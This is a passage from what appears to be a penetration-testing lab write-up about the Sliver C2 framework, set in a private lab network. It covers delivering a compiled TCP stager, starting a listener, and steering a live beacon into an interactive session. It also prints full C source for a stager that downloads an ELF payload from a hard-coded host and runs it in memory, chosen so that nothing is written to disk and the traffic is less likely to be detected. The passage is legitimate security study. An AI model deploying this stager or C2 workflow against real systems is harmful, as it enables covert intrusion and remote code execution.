[*] Symbol obfuscation is enabled
[*] Build completed in 1m25s
[*] Implant saved to /home/steve/box/sliver/payloads/linuxServerExe2p0
```
Next we edit the `TCP stager` with new connection details and recompiled it. Lastly update the `stage-listener` to server our new payload.
```bash
# Edit the stager and recompile
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ musl-gcc -static linuxStager.c -o stager     

# Send it away                                                                                                                            
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ rsync -av stager analyst@192.168.120.219:/home/analyst/Downloads/

# Edit listener
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ vim stage-listener.sh

# Start it
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ ./stage-listener.sh
```

<img width="642" height="180" alt="2026-05-04-02:30:57" src="https://github.com/user-attachments/assets/2a67f2ce-d771-4dda-82a0-d2aab2e58972" />



## AND THE BEACON IS LIVE
<img width="1889" height="332" alt="2026-05-04-02:31:57" src="https://github.com/user-attachments/assets/2e761153-c198-48ce-bf47-99b5c25dc6c5" />

Immediately configure `callback time` to `5s` and `jitter` to `1s`:
```console
sliver (BIZARRE_CLARINET) > reconfig -i 5s -j 1s
[*] Tasked beacon BIZARRE_CLARINET (42fef21f)

# waiting...

[+] BIZARRE_CLARINET completed task 42fef21f

[*] Reconfigured beacon

sliver (BIZARRE_CLARINET) > env
[*] Tasked beacon BIZARRE_CLARINET (6563d8d6)

# waiting...

[+] BIZARRE_CLARINET completed task 6563d8d6
```

Fetch information about tasks:
<img width="1918" height="788" alt="2026-05-04-02:53:50" src="https://github.com/user-attachments/assets/ca69fb08-5eb3-4531-8fdf-8236b7b64acb" />


## Q: Why go through all the trouble?
Because as of now we effectively have a lightweight `TCP payload stager` that is able to fetch payloads we choose, and then execute them in memory. No writing heavy payloads to disk!

Also, the beacon allows us the hide better in the network. A persistent connection would be flagged pretty quickly. **However**, come the day we need a persistent connection, we can simply give the `interactive` command, background the beacon and use the session instead:

```console
sliver (BIZARRE_CLARINET) > interactive
[*] Using beacon's active C2 endpoint: mtls://192.168.120.233:8888
[*] Tasked beacon BIZARRE_CLARINET (98a8e804)

[*] Session d7624b7b BIZARRE_CLARINET - 192.168.120.219:49664 (labvm) - linux/amd64 - Mon, 04 May 2026 02:56:48 EEST

sliver (BIZARRE_CLARINET) > background
[*] Background ...
```
<img width="1853" height="404" alt="2026-05-04-03:02:22" src="https://github.com/user-attachments/assets/c1d7836b-b371-47c2-98fe-fab98bb172f2" />

```
sliver > use d7624b7b

[*] Active session BIZARRE_CLARINET (d7624b7b-9531-4b40-a4b6-77ef89347696)
```
<img width="897" height="1021" alt="2026-05-04-03:00:57" src="https://github.com/user-attachments/assets/67fc8184-4c01-4c83-b1d2-a5a91b1bd3b7" />



## Comparison
I compiled the TCP stager 3 different ways:
```console
17K   Gstager_dynamic
791K  Gstager_static
40K   Mstager_static
```
- `Gstager` => Compiled using `gcc`
- `Mstager` => compiled using `musl-gcc`

The winner in size is `dynamically linked` `glibc`, which is obvious as you don't have to pack all dependencies. 

But when you compare the statically linked binaries, `musl` is the **clear** winner here `40K` < `719K`. It's also more self-contained!

Oh btw, the final `TCP stager` (Linux edition) source code for anyone interested.
Credit to [this guy](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) for getting us up & running!
```C
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

#define ELF_NAME "stage"
#define HOST "192.168.120.233"
#define PORT 8080

int main(void)
{
    int return_value = 1;
    int sd = socket(AF_INET, SOCK_CLOEXEC | SOCK_STREAM, 0);
    if (sd == -1) {
		goto ERROR;
	}

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);

    if (inet_pton(AF_INET, HOST, &sa.sin_addr) < 1) { goto ERROR_SD; }
    if (connect(sd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        goto ERROR_SD;
    }
    // Add debug
    printf("connected\n");
    fflush(stdout);

    uint32_t elf_size = 0;
    if (recv(sd, &elf_size, sizeof(elf_size), 0) != sizeof(elf_size)) {
        goto ERROR_SD;
    }
    elf_size = ntohl(elf_size);

    uint8_t *elf_data = malloc(elf_size);
    if (!elf_data) {
		goto ERROR_SD;
	}

    ssize_t bytes_partial = 0;
    ssize_t bytes_total = 0;
    while (bytes_total < elf_size) {
        bytes_partial = recv(
            sd, elf_data + bytes_total, elf_size - bytes_total, 0);
        if (bytes_partial < 1) {
			goto ERROR_DATA;
		}
        bytes_total += bytes_partial;
    }
    // Add debug
    printf("received payload\n");
    fflush(stdout);

    int md = memfd_create(ELF_NAME, 0);
    if (md == -1) { 
		perror("memfd_create");
		goto ERROR_DATA; 
    }
    // Add debug
    printf("created memfd\n");
    fflush(stdout);

    bytes_total = 0;
    while (bytes_total < elf_size) {
        bytes_partial = write(
            md, elf_data + bytes_total, elf_size - bytes_total);
        if (bytes_partial < 1) {
			goto ERROR_MEMFD;
		}
        bytes_total += bytes_partial;
    }

    char *argv[] = {ELF_NAME, NULL};
    char *envp[] = {NULL};

    lseek(md, 0, SEEK_SET);

    // Add debug
    printf("executing...\n");
    fflush(stdout);
	
    if (fexecve(md, argv, envp) == -1) {
		// Add debug
        perror("fexecve");
		goto ERROR_MEMFD;
    }

    return_value = 0;

ERROR_MEMFD:
    close(md);
ERROR_DATA:
    free(elf_data);
ERROR_SD:
    close(sd);
ERROR:
    return return_value;
}
```

**Help received**
- Sliver C2 | Stagers, Payload Types (Staged vs Stageless), Creating & Running Staged Payloads ([video](<https://www.youtube.com/watch?v=BYnk0jB671k>))
- Sliver C2 [Docs](<https://sliver.sh/docs/>)
- Learning Sliver C2 (06) - [Stagers: Basic](<https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/>)
- Sliver C2 [Deployment for Red Team Engagements](<https://wsummerhill.github.io/redteam/2023/07/25/Sliver-C2-Usage-for-Red-Teams.html>)
- Stagers - [101](<https://blog.retracelabs.io/posts/stager101/stagers-101/>)
- [Stager](<https://encyclopedia.kaspersky.com/glossary/stager/>)
- TCP Stager [source code](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>)







----------------





# It works on my machine:

<img width="1701" height="870" alt="2026-05-02-11:58:30" src="https://github.com/user-attachments/assets/99e51397-df60-441c-a0e8-153e687336af" />


<img width="1402" height="450" alt="2026-05-01-20:22:09" src="https://github.com/user-attachments/assets/34ffdc82-2c18-42d6-b187-b647738b502a" />


<img width="1301" height="381" alt="2026-05-02-13:15:27" src="https://github.com/user-attachments/assets/b3bcc21d-07cb-4b13-9338-58f89101de78" />

## Reinstalled Sliver using [method 2](#install-on-kali) and got a version number out of it:
<img width="346" height="86" alt="2026-05-02-23:11:39" src="https://github.com/user-attachments/assets/cd69a734-f3e9-475b-839e-0b957f712827" />





------------------




# Src & Ref
In Order of Appearance
- [1] <https://github.com/rapid7/metasploitable3>
- [2] <https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>
- [3] <https://sliver.sh/>
- [4] <https://www.geeksforgeeks.org/html/how-to-link-pages-in-html/>
- [5] <https://sliver.sh/docs>
- [6] <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>
- [7] <https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/>
- [8] <https://encyclopedia.kaspersky.com/glossary/stager/>
- [9] <https://blog.retracelabs.io/posts/stager101/stagers-101/>
- [10] <https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18>
- [11] <https://github.com/BishopFox/sliver/tree/master/client/command/generate>
- [12] <https://github.com/BishopFox/sliver/issues/1734>
- [13] <https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>
- [14] <https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>
- [15] <https://lindevs.com/install-musl-gcc-on-ubuntu>
- [16] <https://linuxcommandlibrary.com/man/musl-gcc>
- [17] <https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>
- [18] <https://www.youtube.com/watch?v=BYnk0jB671k>
